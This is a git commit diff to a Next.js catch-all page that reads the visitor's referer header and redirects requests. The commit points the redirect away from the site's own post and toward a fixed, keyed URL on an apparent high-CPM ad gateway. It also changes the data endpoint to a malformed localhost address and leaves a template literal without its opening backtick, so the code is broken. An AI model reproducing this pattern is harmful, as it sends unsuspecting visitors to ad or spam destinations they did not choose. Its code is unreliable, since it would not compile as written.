aded27628147fb34bec9a3f6160e09a66f91f680
verstilevoyager <143584676+verstilevoyager@users.noreply.github.com>
2023-08-31 03:13:23 -0700

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://alcashzone.com/graphql"
+	const endpoint = " http://localhost/verstilevoyager/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alcashzone.com/` + encodeURI(path as string)
+					https://www.highcpmrevenuegate.com/tv5g8ustu?key=07193b86a7fb5d6d9ee8ef38ce31ace1` 
 				}`,
 			},
 		};
